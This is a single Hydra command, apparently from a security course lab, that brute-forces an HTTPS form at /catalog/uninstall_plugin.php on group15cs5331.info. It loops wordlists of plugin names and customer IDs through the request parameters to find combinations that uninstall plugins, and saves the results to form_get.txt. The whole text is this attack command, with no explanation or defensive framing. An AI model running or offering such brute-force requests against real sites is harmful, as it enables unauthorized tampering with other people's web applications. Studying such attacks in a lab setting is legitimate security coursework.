hydra -L plugin_names.txt -P userids.txt group15cs5331.info https-get-form "/catalog/uninstall_plugin.php:customer_id=^PASS^&pluginName=^USER^:*" -o form_get.txt
